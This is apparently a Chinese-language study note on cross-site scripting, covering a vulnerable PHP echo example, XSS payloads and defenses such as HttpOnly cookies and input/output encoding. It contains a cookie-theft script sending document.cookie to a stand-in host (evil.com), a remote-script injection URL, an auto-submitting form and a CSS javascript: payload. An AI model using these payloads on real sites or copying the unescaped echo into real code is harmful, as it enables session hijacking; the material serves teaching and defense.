# XSS攻击的原理及常见攻击与防御

Cross Site Script，指通过HTML注入篡改了网页，插入恶意脚本，从而在用户浏览网页时执行攻击。（一开始这种攻击都是用来演示跨域攻击的，所以叫跨站脚本，到如今是否跨域已经不再重要）

例：
```php
<?php
$input = $_GET["param"];
echo "<div>" . $input . "</div>";
?>
```
提交这样一个请求：
```
test.php?param=<script>alert(/xss/)</script>
```

## XSS Payload
XSS Payload实际上就是JavaScript脚本，所以任何JavaScript脚本能实现的功能XSS Payload都能做到。比如读取Cookies，从而发起Cookies劫持攻击（Cookies中可能有登录凭证）；
例如攻击者先加载这样一个远程脚本：
http://www.a.com/test.html?abc="><script src=http://www.evil.com/evil.js></script>"，正在的Payload写在这个远程脚本中从而避免直接在URL参数中写入大量的Javascript代码。在evil.js中通过如下方式窃取Cookies：
```
var img = document.createElement("img");
img.src = "http://www.evil.com/log?"+escape(document.cookie);
document.body.appendChild(img);
```
【test.html的内容没有，上面的例子不通顺，艹】


同样的，可以通过img的src标签来发起GET请求。对于POST请求，则可以通过JavaScript动态构造一个表单，然后自动提交这个表单来实现：
```
var f = document.createElement("form");
f.action = "...";
f.method = "post";
document.body.appendChild(f);

var il = document.createElement("input");
il.name = "ck";
il.value = "dd";
f.append(il);

f.submit();
```

详略（很多历史问题原理的讨论，现已修复）。

通过style标签也能构造出XSS：
```
<div style="background: url('javascript:alert(1)')">
```

## XSS Worm
一般来说，用户之间发生交互行为的页面（发送站内信、用户留言等），如果存在存储型XSS，则比较容易发起XSS Worm攻击。
详略。

## XSS构造技巧
利用字符编码，绕过长度限制，利用<base>标签，利用window.name等，详略。

## XSS的防御
1.将Cookies设为HttpOnly，浏览器将禁止页面的JavaScript访问带有HttpOnly的Cookie。（严格来说HttpOnly并非为了对抗XSS，它解决的是XSS后的Cookies劫持攻击）。
服务器可能会设置多个Cookie，而HttpOnly可以有选择性地加在任何一个Cookie上：
```php
<?php
header("Set-Cookie:cookie1=test1;");
header("Set-Cookie:cookie2=test2;httponly",false);
?>
```
当通过document.cookie读取cookie时，只有cookie1能被JavaScript读取到。

2.输入检查：即对输入格式进行检查，检查工作必须放在服务器端代码中实现；

3.输出检查：在变量输出到HTML页面时使用编码或转义的方式（HtmlEncode）来防御XSS攻击；